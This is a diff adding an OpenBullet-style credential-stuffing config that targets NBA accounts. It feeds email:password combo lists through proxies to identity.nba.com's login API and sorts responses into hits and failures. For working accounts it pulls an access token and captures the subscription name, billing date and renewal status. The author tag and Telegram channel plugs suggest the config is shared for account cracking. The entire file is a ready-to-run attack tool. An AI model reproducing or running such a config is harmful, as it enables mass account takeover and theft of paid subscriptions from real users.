@@ -1,0 +1,135 @@
+[SETTINGS]
+{
+  "Name": "NBA CONFIGS",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-21T16:55:37.4062375+00:00",
+  "AdditionalInfo": "",
+  "Author": "@Alone_Devilz",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join : @Silverbullet_Configs1",
+      "VariableName": "",
+      "Id": 2110628833
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#ℕ𝔹𝔸_ℂ𝕆ℕ𝔽𝕀𝔾𝕊 REQUEST POST "https://identity.nba.com/api/v1/auth" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "DNT: 1" 
+  HEADER "Host: identity.nba.com" 
+  HEADER "Origin: https://www.nba.com" 
+  HEADER "Referer: https://www.nba.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36" 
+  HEADER "X-Client-Platform: web" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+#𝕂𝔼𝕐_ℂℍ𝔼ℂ𝕂 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password" 
+    KEY "INVALID_EMAIL" 
+    KEY "Invalid JSON payload" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success" 
+
+#𝕃𝕆𝔾𝕀ℕ REQUEST GET "https://identity.nba.com/api/v1/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*dnt: 1" 
+  HEADER "origin: https://www.nba.com" 
+  HEADER "referer: https://www.nba.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+
+#ƎTAᗡ PARSE "<SOURCE>" LR "endeavorCustomerId\":\"" "\"" -> VAR "id" 
+
+#ƎꙅbꙅbTAᗡds REQUEST GET "https://watch.nba.com/secure/authenticate?format=json&skus=true&uidpwd=true&accesstoken=true&esCustomerId=<id>&ciamlogin=true" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "DNT: 1" 
+  HEADER "Host: watch.nba.com" 
+  HEADER "Origin: https://www.nba.com" 
+  HEADER "Referer: https://www.nba.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+
+#ƎꙅbꙅbTAᗡ PARSE "<SOURCE>" LR "accessToken\":\"" "\",\"" -> VAR "access" 
+
+#𝕂𝔼𝕐_ℂℍ𝔼ℂ𝕂 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "hasSubscription\":\"true" 
+
+#ℕ𝔹𝔸_ℂ𝕆ℕ𝔽𝕀𝔾𝕊 REQUEST GET "https://nbaapi.neulion.com/api_nba/v1/account/subscriptions?associations=false" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "authorization: Bearer <access>" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://www.nba.com" 
+  HEADER "referer: https://www.nba.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+
+#𝕊𝕦𝕓𝕤𝕔𝕣𝕚𝕡𝕥𝕚𝕠𝕟 PARSE "<SOURCE>" LR "name\":\"" "\"" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#𝔻𝔸𝕋𝔼 PARSE "<SOURCE>" LR ",\"billedDate\":\"" "\"" CreateEmpty=FALSE -> CAP "Billed" 
+
+#ƎTAᗡ PARSE "<SOURCE>" LR "optinRenew\":" "," CreateEmpty=FALSE -> CAP "Renewal" 
+
+#🅰🆄🆃🅷🅾🆁 FUNCTION Constant "@Alone_Devilz" -> CAP "Configs By : " 
+
+!#Join_Private_channel_at_9$ RECAPTCHA "https://google.com" "" -> VAR "" 
+
